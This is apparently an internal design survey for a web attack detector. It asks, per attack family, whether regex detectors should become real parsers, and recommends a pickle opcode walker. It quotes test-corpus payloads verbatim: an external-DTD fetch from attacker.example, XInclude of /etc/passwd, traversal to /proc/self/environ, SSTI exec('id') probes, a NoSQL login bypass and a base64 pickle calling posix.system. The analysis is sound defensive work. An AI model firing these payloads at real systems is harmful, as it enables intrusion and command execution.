# Should the remaining Lane 2 families run a real parser?

Lane 2 has ten attack families and thirteen detectors. Three of them already run
a genuine parser and build a genuine tree; the rest match bounded regexes against
a normalised view. This document answers, family by family, whether the rest
should join them.

The question is not "are ASTs better than regexes". It is narrower and has a
price attached:

> **Handing an attacker a parser hands the attacker a new attack surface.** For
> each family: is the detection the parse buys worth the parse surface, the CPU,
> and the dependency?

This tree has already paid that bill twice, in both directions, and both receipts
are quoted below.

## Where the tree actually stands

The common summary — "only SQLi and RCE parse, the other eight are regex" — is
wrong in two places, and both matter for the answer.

| layer | parser | what it parses |
|---|---|---|
| `AstSqlDetector` (`detectors.rs:2222`) | `sqlparser` 0.62 `GenericDialect` | SQL → `Statement` / `SetExpr` / `Expr` |
| `RceAstDetector` (`detectors.rs:2982`) | `brush-parser` 0.4.0 | shell → `Program` / `SimpleCommand` / `Pipeline` |
| **`XssDomDetector` (`xss_dom.rs`)** | **`scraper` / Servo `html5ever`** | **WHATWG HTML5 fragment → element tree** |
| `struct_extract::extract_body_fields` (`struct_extract.rs:138`) | `serde_json`, `quick-xml` 0.41, `async-graphql-parser`, `multer` | request **bodies** → leaves handed to every detector |

So XSS-DOM is not a structural matcher — it is a full WHATWG parse, and the
`xss_js` token layer sits on top of the execution contexts that parse extracts.
And every detector already consumes the output of four body parsers it did not
write, because `extract_body_fields` runs first.

That leaves eight detectors that are genuinely pattern-only:

`TraversalStructuralDetector`, `XxeStructuralDetector`, `NoSqlStructuralDetector`,
`SstiStructuralDetector`, `LdapStructuralDetector`, `XpathStructuralDetector`,
`DeserStructuralDetector`, `XssJsTokenDetector`.

## The two receipts

**Receipt one — the parser that cost us.** `brush-parser` 0.4.0's `io_number`
rule takes any all-digit word before `<`/`>` and `.parse().unwrap()`s it into an
`i32`. A 17-byte payload, `x | 2147483648>&1`, overflows and panics; on
2026-07-27 the soak reached it from body, query and header under the shipped
configuration. It is contained now (`contain_parser_panic`, `detectors.rs:3056`,
plus a pre-parse shape filter and a nesting-depth guard), but the containment
comment states the real finding:

> 0.4.0 is the newest release, so there is no version to upgrade to, and the
> crate has upwards of a hundred further `unwrap` / `unreachable` sites — this is
> a class of bug, not one bug.

That is the standing cost of a true AST: not one CVE, an ongoing exposure to
someone else's panic discipline, mitigated by a `catch_unwind` that cannot save
you from a stack overflow.

**Receipt two — the parser we refused, and were right to.** The XXE detector
(`detectors.rs:628`) deliberately runs no XML parser, and says why: not parsing
removes the entire parse-time DoS surface — billion-laughs expansion, deep
nesting, oversized entities — because there is no expansion step to weaponise.
The billion-laughs indicator is a bounded *count* of `<!ENTITY` declarations,
never an expansion.

Both receipts point the same way: the question is per-family, and the default
answer is "no".

## Method

Conclusions below are measured, not asserted. `tests/lane2/` ships a 390-row
corpus (170 attacks, 220 benign) written without reading `crates/`, and
`baseline.json` records what the shipped configuration detects: 74.71 % of
attacks in shadow, 4.55 % benign false-positive rate, 40 attacks blind.

The baseline does not name the 40 blind rows, so the default-on rule tables were
re-implemented against the corpus with a model of the decode chain (URL, HTML
entity, form-parameter split, JSON leaves, blind base64). The simulation
reproduces the recorded per-family numbers almost exactly — XXE 12/15, NoSQL
6/15, LDAP 12/15, XPath 13/15, deserialization 12/15, traversal 18/20, SSTI 6 vs
the recorded 5 — which is close enough to trust the identity of the individual
misses. Every "currently missed" payload named below is a real committed corpus
row, quoted verbatim.

Two candidate detectors were additionally prototyped end-to-end against the whole
corpus (LDAP, below). Neither prototype is in the tree; this is a survey.

## Decision table

| family | today | mature Rust parser? | what a parse would add | new attack surface | CPU | verdict |
|---|---|---|---|---|---|---|
| XSS-DOM | `html5ever` fragment parse (`xss_dom.rs`) | — | — | — | — | **already an AST** |
| NoSQL | anchored match on `serde_json` leaves (`detectors.rs:884`) | — | — | — | — | **already an AST** — the tree is `serde_json`'s |
| XXE | DTD/prolog regex, no parser (`detectors.rs:720`) | `quick-xml` (already in tree) | nothing; all 3 misses are config + one regex row | entity expansion, if you ever use a validating parser | — | **do not** |
| Traversal | encoding regexes (`detectors.rs:582`) | `typed-path` | nothing; both misses are default-off rules | small | small | **do not** |
| SSTI | delimiter+sink co-occurrence (`detectors.rs:1141`) | none — six incompatible grammars | would need 6 parsers for ~6 rows | six template parsers | high | **do not** — no parser exists that covers the family |
| LDAP | filter-break regexes (`detectors.rs:1342`) | none usable; ~120 lines of our own | +1 attack, 3× benign FPs (measured) | small (tiny grammar) | negligible | **do not** — measured, not assumed |
| XPath | structural regexes (`detectors.rs:1536`) | `sxd-xpath` (parser not cleanly separable) | 1 row (`' or 1=1 or ''='`) | recursive-descent expression parser | small | **do not** at family level; see SQL-AST reuse note |
| Deserialization | format-magic + gadget regexes (`detectors.rs:1787`) | pickle: our own ~200-line opcode walker | **protocol ≥2 pickles, which are every real pickle** | ~zero — a flat opcode loop, no recursion, no unpickling | negligible | **should, and the candidate is ours to write** |
| XSS-JS | token scan of extracted handler bodies (`xss_js.rs`) | `boa_parser` / `oxc_parser` / `swc_ecma_parser` | see below | **the largest in the survey** | high | see below |

## Per family

### NoSQL — already an AST, and the gap is in the extractor

`NoSqlStructuralDetector` anchors `^\$(where|function|accumulator)$` against
leaves that `extract_body_fields` produced by walking a `serde_json` tree. The
operator arrives as its own leaf precisely *because* the body was parsed; a
`$ne` sitting inside a string value is a different leaf and cannot anchor-match.
Calling this "regex, not AST" mistakes where the tree is built.

All nine corpus misses confirm it. Seven (`nosql-001`, `-003` … `-007`, `-011`)
are `$ne` / `$gt` / `$or` / `$regex` / `$expr`, every one of which has a written
rule that ships **default-off** pending holdout calibration. A parser adds
nothing to a rule that is switched off.

The remaining two are the interesting ones, and they are extractor bugs, not
detector bugs:

```
nosql-009  POST /login   application/x-www-form-urlencoded
           username=admin&password[$ne]=x
nosql-010  GET  /api/users?user%5B%24ne%5D=admin&pw%5B%24ne%5D=x
```

PHP, Rails, Express (`qs`) and Fastify all expand `password[$ne]=x` into the
nested object `{"password": {"$ne": "x"}}` before it reaches the database driver.
That is how this bypass works in the wild. Lane 2 never surfaces `$ne` as an
operator leaf here because the form-parameter splitter does not implement bracket
notation. The fix is in `struct_extract`, and it would make the *existing*
default-off rules effective the day they are calibrated.

**Verdict: already equivalent to an AST. Do not add a parser; teach the extractor
bracket notation.**

### XXE — the deliberate refusal is still correct

Three corpus rows are missed, and not one of them needs a parser.

```
xxe-004  <!DOCTYPE r SYSTEM "http://attacker.example/x.dtd">
xxe-005  <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;…"> …]>
xxe-006  <foo xmlns:xi="…/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

* `xxe-004` is exactly `xxe.doctype_external`, a written rule that is
  default-off because legitimate XHTML ships `<!DOCTYPE html PUBLIC …>`. A
  configuration flip, gated on route scope.
* `xxe-005` is exactly `xxe.entity_expansion`, `RuleKind::Count(3)`, also
  default-off. The payload declares three entities; the rule would fire. Another
  configuration flip.
* `xxe-006` has no rule at all — and needs a regex, not a parser. `xi:include`
  with an `href` naming `file://` or `http://` is a flat two-token co-occurrence.
  A parser would tell you it is an element in the XInclude namespace, which is
  information you did not need.

The asymmetry is the whole argument. A non-validating pull parser (`quick-xml`,
already in the tree) hands back the DOCTYPE as raw text, to be scanned exactly as
it is scanned now — so it buys nothing. A *validating* parser is the only thing
that would buy anything, and a validating parser is precisely the machine the
attack is designed to detonate. There is no middle position where you gain
structure without gaining the expansion step.

**On the brief's question — can you get structure without giving the attacker the
expansion?** Yes, and the tree already does: `quick-xml`'s pull lexer runs on
XML bodies for field extraction (`struct_extract.rs:273`), resolving only
predefined entities (`resolve_predefined_entity`, line 330), with a pre-parse
`nesting_depth` guard and an event budget. That is lexical scanning without
entity resolution, and it is already shipping. There is no further structure to
extract that the DTD grammar does not hand you as text.

**Verdict: do not. Current design is optimal. Flip two rules and add one row for
XInclude.**

### Traversal — the misses are config, and normalization does not fix the blocker

```
trav-005  /download?file=../../../../../proc/self/environ
trav-016  /render?template=../../../../app/config/database.yml
```

`trav-005` is `traversal.sensitive_abs_ops`, default-off because `/proc/self`
appears in ordinary operations traffic. `trav-016` is a plain `../` chain
(`traversal.plain_dotdot`, default-off) reaching a path that is on no sensitive
list. Neither is a parsing failure.

The plausible "AST" here is lexical path normalization — resolve `..` segments
with `typed-path` and ask whether the result escapes the root, instead of
enumerating `%2e%2e`, `%252e%252e`, `....//`, `%c0%af`. That is a genuinely
tidier way to express what the rules express, and it would generalise past the
enumerated encodings.

It does not help, for a specific reason: normalization cannot fix the false
positive that keeps `plain_dotdot` switched off. `import x from '../util'`
normalizes to an escaping path just as `../../etc/passwd` does. The escape is
real in both. The thing that separates them is whether the field feeds a
filesystem open, which is the RASP ceiling and is not visible to a reverse proxy.
Normalization would buy a cleaner rule with the identical false-positive rate,
which is not a reason to add a dependency.

**Verdict: do not.**

### SSTI — no parser exists that covers this family

The nine misses split cleanly:

| row | payload | why missed |
|---|---|---|
| `ssti-001` | `{{7*7}}` | `ssti.jinja_arith_probe`, default-off |
| `ssti-002` | Jinja config disclosure | bare-delimiter rules default-off |
| `ssti-006` | `#set($x=$rt.getRuntime().exec("id"))` | no Velocity `getRuntime().exec` row |
| `ssti-009` | `{{_self.env.registerUndefinedFilterCallback("exec")}}` | Twig `_self.` is gated to `{%…%}`, not `{{…}}` |
| `ssti-010` | `{php}system('id');{/php}` | no Smarty row |
| `ssti-012` | `{{''|attr('\x5f\x5fclass\x5f\x5f')}}` | hex-escaped dunder survives the decode chain |
| `ssti-013` | Handlebars `constructor` gadget | no Handlebars row |
| `ssti-014` | payload split across query args | cross-field, no detector sees it |
| `ssti-015` | `#{global.process.mainModule.require(…)}` | no Pug/Nunjucks row |

Five of nine are a **missing signature for a template engine nobody wrote a row
for**. That is a rule-authoring task measured in an afternoon. A parser cannot
substitute for it, because there is no such parser: Jinja2, Twig, Velocity,
FreeMarker, Smarty, Handlebars, Pug and ERB have mutually incompatible grammars
and no shared AST. Covering the family by parsing means shipping six parsers, and
each one is a `brush-parser`-shaped liability — six independent panic surfaces
to catch, six depth guards to write, six upstreams to track.

Worse, a parse does not even answer the question. `{{7*7}}` parses identically
whether the backend is Jinja2 or Vue. The detector's own comment is the honest
statement of the ceiling: it judges whether the payload *looks like* SSTI, not
whether a template engine will evaluate it. Parsing does not move that ceiling
one inch, because the ambiguity is about the *backend*, not the payload.

`ssti-012` is the only row where structure would help — a template-aware
evaluator would fold `attr('\x5f\x5fclass\x5f\x5f')` to `attr('__class__')`. But
that is a decode-chain job (add `\xNN` escape decoding to the preprocessor, where
it benefits every family) rather than a parse.

**Verdict: do not. Write the five missing engine signatures; add `\xNN` decoding
to the shared preprocessor.**

### Deserialization — the one clear "yes", and the parser is ours to write

Nine of twelve default-on rules hit. Three misses:

```
deser-006  data=O:8:"stdClass":1:{s:4:"exec";s:2:"id";}
deser-015  data=a:2:{s:4:"user";O:4:"Evil":1:{s:3:"cmd";s:2:"id";}s:1:"x";O:8:"stdClass":0:{}}
deser-009  {"blob":"gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="}
```

The two PHP rows are the known trade: `deser.php_object_injection` (the generic
`O:<len>:"<class>":` header) is written and default-off because ordinary apps
carry `O:8:"stdClass"` in cookies and caches. `deser-015` additionally nests the
object inside a serialized array, which the class-name-anchored default-on rule
cannot reach. A real PHP `serialize()` parser would give structural certainty —
"this is a well-formed serialized graph containing N typed objects at depth D" —
instead of a substring guess, and would reach nested objects. The format is
trivial (length-prefixed, no ambiguity), so a parser is cheap and safe. But the
gain is modest and mostly about false positives.

**`deser-009` is different, and it is the strongest finding in this survey.**

Base64-decoded it is:

```
80 04 95 20 00 00 00 00 00 00 00 8c 05 posix 94 8c 06 system 94 93 94 8c 02 id 94 85 94 52 94 2e
```

Disassembled — a pure structural walk that executes nothing:

```
0: \x80 PROTO 4
2: \x95 FRAME 32
11: \x8c SHORT_BINUNICODE 'posix'
19: \x8c SHORT_BINUNICODE 'system'
28: \x93 STACK_GLOBAL
30: \x8c SHORT_BINUNICODE 'id'
35: \x85 TUPLE1
37: R    REDUCE
39: .    STOP
```

That is an unambiguous `posix.system("id")` reduction. The shipped rule cannot
see it, and not by a near miss:

* the rule is `\bc(?:os|posix|nt)\s+system\b` — it matches the **protocol-0 text
  `GLOBAL` opcode**, `c<module>\n<callable>`;
* pickle protocol ≥ 2 does not emit `c` at all. It pushes two strings and joins
  them with `STACK_GLOBAL` (`\x93`). There is no `c`, and there is no newline;
* protocol 2 has been available since Python 2.3, protocol 4 is the *default*
  since Python 3.8, and `pickle.dumps` has never defaulted to protocol 0 in
  Python 3.

So the default-on pickle rule catches the textbook demonstration payload and
misses everything a real toolchain emits. That is not a tuning gap, it is a
structural blind spot, and no additional regex closes it: the framing bytes are
non-UTF-8 and arrive on the view surface as `U+FFFD` (verified — the lossy view
of this payload is `'�\x04� \x00…�\x05posix��\x06system…'`),
so the module and callable are not adjacent tokens in any view the detector sees.

The parser this needs is unusually cheap and unusually safe:

* **it is not a deserializer.** `pickletools.genops` semantics: read an opcode
  byte, read its fixed or length-prefixed argument, advance. Nothing is
  constructed, no module is imported, no reduction is performed. The gadget is
  named, never instantiated;
* **it does not recurse.** A pickle opcode stream is flat. There is no depth to
  bound, so the `brush-parser` stack-overflow class does not exist here;
* **it is bounded by construction.** Every opcode's argument length is either
  fixed or read from an explicit length field that can be validated against the
  remaining buffer before the read;
* **there is no dependency.** `serde-pickle` is the obvious crate, but it
  deserializes into a value tree — more machinery than needed and a broader
  surface. Roughly 200 lines of opcode table plus a stack-tracking walk covers
  every `GLOBAL` / `STACK_GLOBAL` / `REDUCE` / `INST` / `OBJ` / `NEWOBJ` shape,
  with no new supply chain at all.

The detection it buys is the thing every other family in this survey cannot
offer: a **structurally certain** verdict. `STACK_GLOBAL` naming `posix.system`
followed by `REDUCE` is not "this looks like an attack" — it is "this byte
stream, if unpickled, calls `posix.system`". That is the only place in Lane 2
where a parse escapes the RASP ceiling rather than merely restating it, because
the pickle stream *is* the program, not a hint about one.

**Verdict: should, and the candidate is ~200 lines of our own code with zero new
dependencies.**

## Unfinished

This section is filled in as the remaining families are evaluated.
